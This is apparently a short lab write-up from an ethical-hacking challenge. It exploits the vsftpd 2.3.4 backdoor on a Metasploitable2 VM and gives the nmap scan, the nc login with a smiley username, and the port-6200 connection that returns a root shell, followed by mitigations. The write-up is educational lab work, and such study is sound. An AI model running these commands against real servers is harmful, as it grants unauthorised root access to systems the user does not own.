DAY 10 | VSFTPD 2.3.4 Backdoor → ROOT

**Target:** Metasploitable2 - 192.168.56.101  
**Attacker:** Kali Linux  
**Port:** 21/tcp (vsftpd 2.3.4) → 6200/tcp backdoor  
**Severity:** Critical - Unauthenticated RCE → Root

Summary
From anonymous FTP to full root in 2 commands. vsftpd 2.3.4 was distributed with a malicious backdoor where any username containing `:)` triggers a root shell on TCP 6200.

This is part of my **30 Days of Ethical Hacking Challenge**.

Recon
```bash
nmap -p 21 -sV 192.168.56.101
21/tcp open  ftp  vsftpd 2.3.4
Exploitation - Manual Method
Terminal 1:
nc 192.168.56.101 21
USER letmein:)
PASS anything
Terminal 2 (within 5s):
nc 192.168.56.101 6200
id
uid=0(root) gid=0(root)
whoami
root
Mitigation
- Upgrade to 2.3.5+
- Disable anonymous FTP
- Monitor 6200/tcp
- Firewall filtering

Disclaimer
For educational purposes only. Lab: Metasploitable2 intentionally vulnerable VM.
